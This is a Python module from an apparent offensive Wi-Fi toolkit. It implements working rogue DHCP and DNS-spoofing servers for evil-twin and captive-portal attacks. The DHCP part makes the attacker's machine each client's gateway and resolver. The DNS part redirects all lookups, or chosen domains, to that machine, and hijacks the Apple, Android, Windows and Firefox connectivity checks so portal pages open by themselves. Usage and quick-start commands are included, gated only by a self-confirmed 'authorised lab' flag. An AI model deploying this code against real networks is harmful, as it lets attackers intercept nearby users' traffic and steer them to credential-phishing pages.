#!/usr/bin/env python3
# Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""Native DNS and DHCP servers for captive portal and evil twin attacks.

Replaces dnsmasq with 100% Python implementations using dnslib (DNS)
and Scapy (DHCP). Both servers run as background threads and can be
started/stopped independently.

DNS server: redirect all queries to captive portal IP (or selectively
spoof specific domains while forwarding others).

DHCP server: allocate IPs on the rogue AP subnet, assign gateway and
DNS to point clients to the captive portal.

Dependencies:
  - dnslib: pure Python DNS library (pip install dnslib)
  - scapy: for DHCP packet handling

OS requirement: Linux only (raw sockets, network namespace).

Version: 1.0.0
"""

from __future__ import annotations

import ipaddress
import logging
import socket
import threading
import time
from typing import Any, Dict, List, Optional, Tuple

from wirelessxpl.core.exploit import *
from wirelessxpl.modules.generic.wifi._disclaimer import require_authorised_lab

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Optional dependency: dnslib
# ---------------------------------------------------------------------------
try:
    from dnslib import A, AAAA, DNSRecord, QTYPE, RR  # noqa: F401

    HAS_DNSLIB = True
except ImportError:
    HAS_DNSLIB = False
    logger.warning("dnslib not installed. DNS server unavailable. pip install dnslib")

# ---------------------------------------------------------------------------
# Optional dependency: scapy
# ---------------------------------------------------------------------------
try:
    from scapy.all import (  # noqa: F401
        BOOTP,
        DHCP,
        IP,
        UDP,
        Ether,
        conf as scapy_conf,
        get_if_hwaddr,
        sendp,
        sniff,
    )

    HAS_SCAPY = True
except ImportError:
    HAS_SCAPY = False
    logger.warning("scapy not installed. DHCP server unavailable. pip install scapy")

# ---------------------------------------------------------------------------
# Connectivity-check domains used by OS captive portal detectors.
# Responding with the portal IP triggers the built-in captive portal
# assistant on Apple, Android, Windows, and Firefox clients.
# ---------------------------------------------------------------------------
_CONNECTIVITY_DOMAINS: frozenset = frozenset(
    {
        # Apple CNA
        "captive.apple.com",
        "www.apple.com",
        "apple.com",
        # Google / Android
        "connectivitycheck.gstatic.com",
        "connectivitycheck.android.com",
        "clients1.google.com",
        "clients3.google.com",
        "www.google.com",
        "www.gstatic.com",
        # Microsoft NCSI / NCA
        "www.msftncsi.com",
        "msftncsi.com",
        "www.msftconnecttest.com",
        "ipv6.msftconnecttest.com",
        # Mozilla / Firefox
        "detectportal.firefox.com",
        "www.mozilla.org",
        # Amazon Kindle
        "spectrum.s3.amazonaws.com",
        # Fallback
        "www.example.com",
        "example.com",
        "neverssl.com",
    }
)


# ---------------------------------------------------------------------------
# CaptiveDNSServer
# ---------------------------------------------------------------------------


class CaptiveDNSServer(threading.Thread):
    """UDP DNS server that redirects queries to a captive portal IP.

    Supports two modes:
      - captive: all A queries -> portal_ip. AAAA returns empty answer,
        which causes the client to retry with A records.
      - spoof: only listed domains are redirected; all other queries
        are forwarded to upstream_dns.

    In both modes the standard OS connectivity-check domains are always
    redirected so captive portal assistants trigger immediately.

    Args:
        portal_ip: IPv4 address of the captive portal.
        listen_ip: Local IP to bind the UDP socket to.
        port: UDP port for DNS (default 53; requires root).
        mode: "captive" or "spoof".
        spoof_domains: Additional domains to redirect in spoof mode.
        upstream_dns: Upstream resolver used in spoof mode for
            non-matching queries (empty string disables forwarding).

    Raises:
        ImportError: If dnslib is not installed.
    """

    def __init__(
        self,
        portal_ip: str,
        listen_ip: str = "0.0.0.0",
        port: int = 53,
        mode: str = "captive",
        spoof_domains: Optional[List[str]] = None,
        upstream_dns: str = "8.8.8.8",
    ) -> None:
        if not HAS_DNSLIB:
            raise ImportError(
                "dnslib is required for CaptiveDNSServer. pip install dnslib"
            )
        super().__init__(daemon=True, name="captive-dns")
        self._portal_ip = portal_ip
        self._listen_ip = listen_ip
        self._port = port
        self._mode = mode.lower()
        self._upstream_dns = upstream_dns
        self._stop_event = threading.Event()
        self._lock = threading.Lock()
        self._query_log: List[Tuple[str, str, str]] = []

        # Build spoof domain set (connectivity domains always included)
        self._spoof_domains: set = set(_CONNECTIVITY_DOMAINS)
        if spoof_domains:
            self._spoof_domains.update(d.lower().rstrip(".") for d in spoof_domains)

    # ------------------------------------------------------------------
    # Thread entry point
    # ------------------------------------------------------------------

    def run(self) -> None:
        """Main DNS server loop - blocks until stop() is called."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            sock.bind((self._listen_ip, self._port))
        except OSError as exc:
            logger.error(
                "DNS server bind failed on %s:%d - %s (root required for port 53)",
                self._listen_ip,
                self._port,
                exc,
            )
            return

        sock.settimeout(1.0)
        logger.info(
            "DNS server listening on %s:%d (mode=%s, portal=%s)",
            self._listen_ip,
            self._port,
            self._mode,
            self._portal_ip,
        )

        while not self._stop_event.is_set():
            try:
                data, addr = sock.recvfrom(4096)
            except socket.timeout:
                continue
            except OSError as exc:
                if not self._stop_event.is_set():
                    logger.error("DNS socket error: %s", exc)
                break

            try:
                reply_data = self._process(data)
                if reply_data:
                    sock.sendto(reply_data, addr)
            except Exception as exc:
                logger.debug("DNS handler error from %s: %s", addr, exc)

        try:
            sock.close()
        except Exception:
            pass
        logger.info("DNS server stopped")

    # ------------------------------------------------------------------
    # Packet processing
    # ------------------------------------------------------------------

    def _process(self, data: bytes) -> Optional[bytes]:
        """Parse a DNS query and return a serialized response.

        Args:
            data: Raw UDP payload containing the DNS query.

        Returns:
            Serialized DNS response bytes, or None on parse error.
        """
        try:
            request = DNSRecord.parse(data)
        except Exception as exc:
            logger.debug("DNS parse error: %s", exc)
            return None

        qname: str = str(request.q.qname).rstrip(".")
        qtype: str = QTYPE[request.q.qtype]

        redirect_ip = self._resolve(qname, qtype)

        reply = request.reply()

        if redirect_ip:
            # Redirect A query to portal
            reply.add_answer(
                RR(
                    rname=request.q.qname,
                    rtype=QTYPE.A,
                    rdata=A(redirect_ip),
                    ttl=10,
                )
            )
            self._log(qname, f"-> {redirect_ip}")
            return reply.pack()

        if self._mode == "spoof" and self._upstream_dns:
            # Forward unmatched query to upstream
            upstream_reply = self._forward(data)
            if upstream_reply:
                self._log(qname, "forwarded")
                return upstream_reply
            # Upstream failed - return SERVFAIL
            self._log(qname, "forward-failed")
            reply.header.rcode = 2  # SERVFAIL
            return reply.pack()

        # Captive mode or no upstream: return empty NOERROR answer
        self._log(qname, "captive-empty")
        return reply.pack()

    def _resolve(self, qname: str, qtype: str) -> Optional[str]:
        """Return portal_ip if this query should be redirected, else None.

        Args:
            qname: Queried domain (trailing dot already stripped).
            qtype: Query type string (e.g. "A", "AAAA", "MX").

        Returns:
            Portal IP string for A queries that match, None otherwise.
        """
        if qtype != "A":
            # Only spoof A records; AAAA returns empty answer (OS falls back to A)
            return None

        if self._mode == "captive":
            return self._portal_ip

        # Spoof mode - check domain membership
        clean = qname.lower()
        if clean in self._spoof_domains:
            return self._portal_ip
        # Check if clean is a subdomain of any spoof entry
        for domain in self._spoof_domains:
            if clean.endswith("." + domain):
                return self._portal_ip

        return None

    def _forward(self, data: bytes) -> Optional[bytes]:
        """Forward raw DNS query bytes to the upstream resolver.

        Args:
            data: Raw DNS query packet.

        Returns:
            Raw DNS response from upstream, or None on failure.
        """
        try:
            upstream_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            upstream_sock.settimeout(2.0)
            upstream_sock.sendto(data, (self._upstream_dns, 53))
            reply, _ = upstream_sock.recvfrom(4096)
            upstream_sock.close()
            return reply
        except Exception as exc:
            logger.debug("Upstream DNS forward to %s failed: %s", self._upstream_dns, exc)
            return None

    def _log(self, qname: str, action: str) -> None:
        """Append a query log entry (thread-safe).

        Args:
            qname: Queried domain name.
            action: Description of the action taken.
        """
        with self._lock:
            self._query_log.append(
                (time.strftime("%Y-%m-%dT%H:%M:%S"), qname, action)
            )

    # ------------------------------------------------------------------
    # Control interface
    # ------------------------------------------------------------------

    def stop(self) -> None:
        """Signal the server thread to stop."""
        self._stop_event.set()

    @property
    def is_running(self) -> bool:
        """True if the server thread is alive."""
        return self.is_alive()

    @property
    def query_log(self) -> List[Tuple[str, str, str]]:
        """Snapshot of query log as (timestamp, qname, action) tuples."""
        with self._lock:
            return list(self._query_log)


# ---------------------------------------------------------------------------
# CaptiveDHCPServer
# ---------------------------------------------------------------------------


class CaptiveDHCPServer(threading.Thread):
    """DHCP server for rogue AP captive portal using Scapy.

    Listens for BOOTP/DHCP broadcast packets on the given interface and
    responds to DISCOVER, REQUEST, and RELEASE messages. Gateway and DNS
    options in the offer are set to portal_ip so that connected clients
    route through and resolve via the captive portal.

    The interface should already have portal_ip assigned before starting
    this server (e.g. via ``ip addr add <portal_ip>/24 dev <iface>``).

    IP allocation is sequential within [pool_start, pool_end] (last
    octet of the /24 network). Leases are kept in memory only; there is
    no persistence or expiry - appropriate for short-lived captive portal
    sessions.

    Args:
        interface: Network interface to sniff and send on.
        portal_ip: Captive portal IP (gateway + DNS for clients).
        subnet_mask: Subnet mask advertised to clients.
        pool_start: First usable last-octet value in the IP pool.
        pool_end: Last usable last-octet value in the IP pool.
        lease_time: DHCP lease duration advertised in seconds.

    Raises:
        ImportError: If scapy is not installed.
    """

    def __init__(
        self,
        interface: str,
        portal_ip: str = "10.0.0.1",
        subnet_mask: str = "255.255.255.0",
        pool_start: int = 10,
        pool_end: int = 200,
        lease_time: int = 3600,
    ) -> None:
        if not HAS_SCAPY:
            raise ImportError(
                "scapy is required for CaptiveDHCPServer. pip install scapy"
            )
        super().__init__(daemon=True, name="captive-dhcp")
        self._interface = interface
        self._portal_ip = portal_ip
        self._subnet_mask = subnet_mask
        self._lease_time = lease_time
        self._stop_event = threading.Event()
        self._lock = threading.Lock()

        # Build IP pool from the /24 implied by portal_ip + subnet_mask
        try:
            network = ipaddress.IPv4Network(
                f"{portal_ip}/{subnet_mask}", strict=False
            )
        except ValueError:
            network = ipaddress.IPv4Network("10.0.0.0/24")

        self._pool: List[str] = [
            str(host)
            for host in network.hosts()
            if pool_start <= int(str(host).split(".")[-1]) <= pool_end
            and str(host) != portal_ip
        ]

        self._leases: Dict[str, str] = {}   # mac -> confirmed ip
        self._offered: Dict[str, str] = {}  # mac -> pending offer ip
        self._server_mac: str = ""

    # ------------------------------------------------------------------
    # Thread entry point
    # ------------------------------------------------------------------

    def run(self) -> None:
        """Main DHCP server loop - blocks until stop() is called."""
        try:
            self._server_mac = get_if_hwaddr(self._interface)
        except Exception as exc:
            logger.warning("Could not read interface MAC for %s: %s", self._interface, exc)
            self._server_mac = "02:00:00:00:00:01"

        # Accept broadcast DHCP packets regardless of our IP
        scapy_conf.checkIPaddr = False  # type: ignore[attr-defined]

        logger.info(
            "DHCP server on %s (portal=%s, pool=%d addresses)",
            self._interface,
            self._portal_ip,
            len(self._pool),
        )

        while not self._stop_event.is_set():
            try:
                sniff(
                    iface=self._interface,
                    filter="udp and (port 67 or port 68)",
                    prn=self._handle_packet,
                    store=False,
                    timeout=1.0,
                )
            except Exception as exc:
                if not self._stop_event.is_set():
                    logger.error("DHCP sniff error: %s", exc)
                break

        logger.info("DHCP server stopped")

    # ------------------------------------------------------------------
    # Packet handlers
    # ------------------------------------------------------------------

    def _get_msg_type(self, pkt: Any) -> Optional[str]:
        """Extract the DHCP message-type option value.

        Args:
            pkt: Scapy packet with a DHCP layer.

        Returns:
            Message type string ("discover", "request", "release", etc.)
            or None if not present.
        """
        _type_map: Dict[int, str] = {
            1: "discover",
            2: "offer",
            3: "request",
            4: "decline",
            5: "ack",
            6: "nak",
            7: "release",
            8: "inform",
        }
        for opt in pkt[DHCP].options:
            if isinstance(opt, tuple) and opt[0] == "message-type":
                return _type_map.get(int(opt[1]))
        return None

    def _allocate_ip(self, mac: str) -> Optional[str]:
        """Return an IP for mac, reusing existing lease or offer if present.

        Args:
            mac: Client MAC address string (colon-separated lowercase).

        Returns:
            IPv4 address string, or None if the pool is exhausted.
        """
        with self._lock:
            if mac in self._leases:
                return self._leases[mac]
            if mac in self._offered:
                return self._offered[mac]
            used = set(self._leases.values()) | set(self._offered.values())
            for ip in self._pool:
                if ip not in used:
                    return ip
            return None

    def _chaddr_bytes(self, mac: str) -> bytes:
        """Convert MAC string to 16-byte BOOTP chaddr field.

        Args:
            mac: MAC address string, e.g. "aa:bb:cc:dd:ee:ff".

        Returns:
            16-byte bytes object (6-byte MAC padded with zeros).
        """
        try:
            raw = bytes.fromhex(mac.replace(":", "").replace("-", ""))
        except ValueError:
            raw = b"\x00" * 6
        return raw[:6] + b"\x00" * 10

    def _handle_packet(self, pkt: Any) -> None:
        """Dispatch incoming DHCP packet to the appropriate handler.

        Args:
            pkt: Raw Scapy packet received from the sniffer.
        """
        if not (BOOTP in pkt and DHCP in pkt):
            return

        msg_type = self._get_msg_type(pkt)
        client_mac = str(pkt[Ether].src).lower()
        xid = int(pkt[BOOTP].xid)

        if msg_type == "discover":
            self._send_offer(pkt, client_mac, xid)
        elif msg_type == "request":
            self._send_ack_or_nak(pkt, client_mac, xid)
        elif msg_type == "release":
            self._handle_release(client_mac)

    def _send_offer(self, pkt: Any, client_mac: str, xid: int) -> None:
        """Build and send a DHCP OFFER in response to a DISCOVER.

        Args:
            pkt: Original DISCOVER packet.
            client_mac: Client MAC address string.
            xid: Transaction identifier from the client packet.
        """
        offered_ip = self._allocate_ip(client_mac)
        if not offered_ip:
            logger.warning("DHCP pool exhausted; cannot offer IP to %s", client_mac)
            return

        with self._lock:
            self._offered[client_mac] = offered_ip

        offer = (
            Ether(dst="ff:ff:ff:ff:ff:ff", src=self._server_mac)
            / IP(src=self._portal_ip, dst="255.255.255.255")
            / UDP(sport=67, dport=68)
            / BOOTP(
                op=2,
                yiaddr=offered_ip,
                siaddr=self._portal_ip,
                giaddr="0.0.0.0",
                chaddr=self._chaddr_bytes(client_mac),
                xid=xid,
                flags=pkt[BOOTP].flags,
            )
            / DHCP(
                options=[
                    ("message-type", "offer"),
                    ("server_id", self._portal_ip),
                    ("lease_time", self._lease_time),
                    ("subnet_mask", self._subnet_mask),
                    ("router", self._portal_ip),
                    ("name_server", self._portal_ip),
                    "end",
                ]
            )
        )

        try:
            sendp(offer, iface=self._interface, verbose=False)
            logger.info("DHCP OFFER %s -> %s", client_mac, offered_ip)
        except Exception as exc:
            logger.error("DHCP OFFER send failed: %s", exc)

    def _send_ack_or_nak(self, pkt: Any, client_mac: str, xid: int) -> None:
        """Build and send DHCP ACK or NAK for a REQUEST.

        Args:
            pkt: Original REQUEST packet.
            client_mac: Client MAC address string.
            xid: Transaction identifier.
        """
        # Ignore REQUESTs directed at a different server
        for opt in pkt[DHCP].options:
            if isinstance(opt, tuple) and opt[0] == "server_id":
                if str(opt[1]) != self._portal_ip:
                    return

        # Determine which IP the client is requesting
        requested_ip: Optional[str] = None
        for opt in pkt[DHCP].options:
            if isinstance(opt, tuple) and opt[0] == "requested_addr":
                requested_ip = str(opt[1])
                break

        # Fall back to ciaddr for renewal messages
        if not requested_ip:
            ciaddr = str(pkt[BOOTP].ciaddr)
            if ciaddr and ciaddr != "0.0.0.0":
                requested_ip = ciaddr

        confirmed_ip = (
            self._offered.get(client_mac)
            or self._leases.get(client_mac)
            or self._allocate_ip(client_mac)
        )

        # If requested IP conflicts with our allocation, send NAK
        if requested_ip and confirmed_ip and requested_ip != confirmed_ip:
            self._send_nak(client_mac, xid, pkt)
            return

        if not confirmed_ip:
            self._send_nak(client_mac, xid, pkt)
            return

        # Confirm the lease
        with self._lock:
            self._leases[client_mac] = confirmed_ip
            self._offered.pop(client_mac, None)

        ack = (
            Ether(dst="ff:ff:ff:ff:ff:ff", src=self._server_mac)
            / IP(src=self._portal_ip, dst="255.255.255.255")
            / UDP(sport=67, dport=68)
            / BOOTP(
                op=2,
                yiaddr=confirmed_ip,
                siaddr=self._portal_ip,
                giaddr="0.0.0.0",
                chaddr=self._chaddr_bytes(client_mac),
                xid=xid,
                flags=pkt[BOOTP].flags,
            )
            / DHCP(
                options=[
                    ("message-type", "ack"),
                    ("server_id", self._portal_ip),
                    ("lease_time", self._lease_time),
                    ("subnet_mask", self._subnet_mask),
                    ("router", self._portal_ip),
                    ("name_server", self._portal_ip),
                    "end",
                ]
            )
        )

        try:
            sendp(ack, iface=self._interface, verbose=False)
            logger.info("DHCP ACK  %s -> %s", client_mac, confirmed_ip)
        except Exception as exc:
            logger.error("DHCP ACK send failed: %s", exc)

    def _send_nak(self, client_mac: str, xid: int, pkt: Any) -> None:
        """Send DHCP NAK to reject a REQUEST.

        Args:
            client_mac: Client MAC address string.
            xid: Transaction identifier.
            pkt: Original REQUEST packet (for flags field).
        """
        nak = (
            Ether(dst="ff:ff:ff:ff:ff:ff", src=self._server_mac)
            / IP(src=self._portal_ip, dst="255.255.255.255")
            / UDP(sport=67, dport=68)
            / BOOTP(
                op=2,
                chaddr=self._chaddr_bytes(client_mac),
                xid=xid,
            )
            / DHCP(
                options=[
                    ("message-type", "nak"),
                    ("server_id", self._portal_ip),
                    "end",
                ]
            )
        )
        try:
            sendp(nak, iface=self._interface, verbose=False)
            logger.debug("DHCP NAK  %s", client_mac)
        except Exception as exc:
            logger.debug("DHCP NAK send failed: %s", exc)

    def _handle_release(self, client_mac: str) -> None:
        """Remove the lease for a client that sent RELEASE.

        Args:
            client_mac: Client MAC address string.
        """
        with self._lock:
            ip = self._leases.pop(client_mac, None)
        if ip:
            logger.info("DHCP RELEASE %s freed %s", client_mac, ip)

    # ------------------------------------------------------------------
    # Control interface
    # ------------------------------------------------------------------

    def stop(self) -> None:
        """Signal the server thread to stop."""
        self._stop_event.set()

    @property
    def is_running(self) -> bool:
        """True if the server thread is alive."""
        return self.is_alive()

    @property
    def leases(self) -> Dict[str, str]:
        """Snapshot of confirmed MAC -> IP leases."""
        with self._lock:
            return dict(self._leases)


# ---------------------------------------------------------------------------
# CaptiveNetwork
# ---------------------------------------------------------------------------


class CaptiveNetwork:
    """Convenience wrapper that manages DNS and DHCP servers together.

    Starts both servers as daemon threads and provides unified start/stop
    and status interface. Either server is silently skipped if its
    dependency (dnslib or scapy) is missing.

    Args:
        interface: Network interface for DHCP.
        portal_ip: Captive portal IP (gateway, DNS, and redirect target).
        dns_mode: "captive" (redirect all) or "spoof" (selective).
        dns_spoof_domains: Extra domains to redirect in spoof mode.
        dns_upstream: Upstream DNS used by spoof mode for non-matches.
        subnet_mask: DHCP subnet mask.
        dhcp_pool_start: First usable last-octet value in the IP pool.
        dhcp_pool_end: Last usable last-octet value in the IP pool.
        lease_time: DHCP lease time in seconds.
        dns_listen_ip: IP address the DNS socket should bind to.
        dns_port: DNS UDP port (default 53; requires root).

    Example:
        net = CaptiveNetwork(interface="wlan0", portal_ip="10.0.0.1")
        net.start()
        time.sleep(60)
        net.stop()
    """

    def __init__(
        self,
        interface: str,
        portal_ip: str = "10.0.0.1",
        dns_mode: str = "captive",
        dns_spoof_domains: Optional[List[str]] = None,
        dns_upstream: str = "8.8.8.8",
        subnet_mask: str = "255.255.255.0",
        dhcp_pool_start: int = 10,
        dhcp_pool_end: int = 200,
        lease_time: int = 3600,
        dns_listen_ip: str = "0.0.0.0",
        dns_port: int = 53,
    ) -> None:
        self._interface = interface
        self._portal_ip = portal_ip
        self._dns_server: Optional[CaptiveDNSServer] = None
        self._dhcp_server: Optional[CaptiveDHCPServer] = None

        if HAS_DNSLIB:
            self._dns_server = CaptiveDNSServer(
                portal_ip=portal_ip,
                listen_ip=dns_listen_ip,
                port=dns_port,
                mode=dns_mode,
                spoof_domains=dns_spoof_domains,
                upstream_dns=dns_upstream,
            )

        if HAS_SCAPY:
            self._dhcp_server = CaptiveDHCPServer(
                interface=interface,
                portal_ip=portal_ip,
                subnet_mask=subnet_mask,
                pool_start=dhcp_pool_start,
                pool_end=dhcp_pool_end,
                lease_time=lease_time,
            )

    def start(self) -> None:
        """Start DNS and DHCP servers as daemon threads."""
        if self._dns_server:
            self._dns_server.start()
        else:
            logger.warning(
                "DNS server unavailable - install dnslib: pip install dnslib"
            )

        if self._dhcp_server:
            self._dhcp_server.start()
        else:
            logger.warning(
                "DHCP server unavailable - install scapy: pip install scapy"
            )

    def stop(self) -> None:
        """Stop both servers."""
        if self._dns_server and self._dns_server.is_running:
            self._dns_server.stop()
        if self._dhcp_server and self._dhcp_server.is_running:
            self._dhcp_server.stop()

    def status(self) -> Dict[str, Any]:
        """Return a status snapshot dict.

        Returns:
            Dict with 'dns' and 'dhcp' sub-dicts, each containing
            'running', 'available', and service-specific fields.
        """
        return {
            "dns": {
                "running": bool(
                    self._dns_server and self._dns_server.is_running
                ),
                "available": HAS_DNSLIB,
                "portal_ip": self._portal_ip,
                "mode": getattr(self._dns_server, "_mode", "n/a"),
            },
            "dhcp": {
                "running": bool(
                    self._dhcp_server and self._dhcp_server.is_running
                ),
                "available": HAS_SCAPY,
                "leases": self._dhcp_server.leases if self._dhcp_server else {},
            },
        }

    @property
    def connected_clients(self) -> Dict[str, str]:
        """Active DHCP leases as MAC -> IP dict."""
        if self._dhcp_server:
            return self._dhcp_server.leases
        return {}


# ---------------------------------------------------------------------------
# WXF Exploit class
# ---------------------------------------------------------------------------


class Exploit(Exploit):
    """Native DNS and DHCP servers for captive portal deployments."""

    __info__ = {
        "name": "Native DNS/DHCP Server",
        "description": (
            "100% Python DNS and DHCP servers replacing dnsmasq. "
            "DNS (dnslib) redirects all or selective queries to the captive "
            "portal IP. DHCP (Scapy) allocates IPs on the rogue AP subnet "
            "with gateway and DNS pointing to the portal. Both run as "
            "background threads and can be started/stopped independently."
        ),
        "authors": ("Andre Henrique (@mrhenrike) | Uniao Geek",),
        "references": (
            "https://github.com/paulc/dnslib",
            "https://scapy.net/",
            "https://datatracker.ietf.org/doc/html/rfc2131",
        ),
        "devices": ("wifi", "802.11", "ethernet"),
    }

    mode = OptString("info", "Mode: info | start | status")
    interface = OptString("", "Network interface for DHCP (e.g. wlan0)")
    portal_ip = OptString("10.0.0.1", "Captive portal IP address")
    dns_mode = OptString("captive", "DNS mode: captive (all) or spoof (selective)")
    dns_port = OptInteger(53, "DNS server UDP port (53 requires root)")
    dns_listen_ip = OptString("0.0.0.0", "IP address the DNS socket binds to")
    upstream_dns = OptString("8.8.8.8", "Upstream DNS for non-spoofed queries")
    subnet_mask = OptString("255.255.255.0", "DHCP subnet mask")
    dhcp_pool_start = OptInteger(10, "First IP in pool (last octet of the /24)")
    dhcp_pool_end = OptInteger(200, "Last IP in pool (last octet of the /24)")
    lease_time = OptInteger(3600, "DHCP lease time in seconds")
    i_know_scope = OptBool(False, "Confirm authorized lab environment")

    def check(self) -> str:
        """Verify dependencies are available."""
        parts = [
            f"dnslib={'OK' if HAS_DNSLIB else 'MISSING (pip install dnslib)'}",
            f"scapy={'OK' if HAS_SCAPY else 'MISSING (pip install scapy)'}",
        ]
        iface = str(self.interface).strip()
        if iface:
            parts.append(f"interface={iface}")
        return " | ".join(parts)

    def run(self) -> None:
        """Entry point dispatched by the WXF CLI."""
        op = str(self.mode).strip().lower()

        if op == "info":
            self._info()
            return

        if op == "status":
            print_info(self.check())
            return

        if not bool(self.i_know_scope):
            print_error("Set i_know_scope = true to confirm authorized lab.")
            return
        require_authorised_lab()

        iface = str(self.interface).strip()
        if not iface:
            print_error("Set interface (e.g. set interface wlan0).")
            return

        if op == "start":
            self._start(iface)
        else:
            print_error(
                f"Unknown mode: {op}. Valid: info, start, status"
            )

    def _info(self) -> None:
        """Print usage information."""
        print_info("Native DNS/DHCP Server")
        print_info("=" * 50)
        print_info("")
        print_info("Replaces dnsmasq with pure Python implementations.")
        print_info(
            f"  dnslib : {'OK' if HAS_DNSLIB else 'missing - pip install dnslib'}"
        )
        print_info(
            f"  scapy  : {'OK' if HAS_SCAPY else 'missing - pip install scapy'}"
        )
        print_info("")
        print_info("DNS modes:")
        print_info("  captive - redirect ALL A queries to portal_ip")
        print_info("  spoof   - redirect specific domains, forward rest upstream")
        print_info("")
        print_info("Setup before starting:")
        print_info("  sudo ip addr add 10.0.0.1/24 dev wlan0")
        print_info("  sudo ip link set wlan0 up")
        print_info("")
        print_info("Quick start:")
        print_info(
            "  set interface wlan0; set portal_ip 10.0.0.1; "
            "set mode start; set i_know_scope true; run"
        )

    def _start(self, iface: str) -> None:
        """Start the captive network services and block until Ctrl+C.

        Args:
            iface: Network interface name.
        """
        portal_ip = str(self.portal_ip).strip()

        net = CaptiveNetwork(
            interface=iface,
            portal_ip=portal_ip,
            dns_mode=str(self.dns_mode).strip().lower(),
            dns_upstream=str(self.upstream_dns).strip(),
            subnet_mask=str(self.subnet_mask).strip(),
            dhcp_pool_start=int(self.dhcp_pool_start),
            dhcp_pool_end=int(self.dhcp_pool_end),
            lease_time=int(self.lease_time),
            dns_listen_ip=str(self.dns_listen_ip).strip(),
            dns_port=int(self.dns_port),
        )

        net.start()
        status = net.status()

        print_success("Captive network services started.")
        print_info(
            f"  DNS  : port {self.dns_port} "
            f"(mode={status['dns']['mode']}, "
            f"running={status['dns']['running']})"
        )
        print_info(
            f"  DHCP : {iface}, gateway={portal_ip} "
            f"(running={status['dhcp']['running']})"
        )
        print_info("  Press Ctrl+C to stop.")

        try:
            while True:
                time.sleep(10)
                leases = net.connected_clients
                if leases:
                    print_info(f"  Active leases: {len(leases)}")
                    for mac, ip in leases.items():
                        print_info(f"    {mac} -> {ip}")
        except KeyboardInterrupt:
            print_status("Stopping captive network services...")
            net.stop()
            print_info(f"Total clients served: {len(net.connected_clients)}")
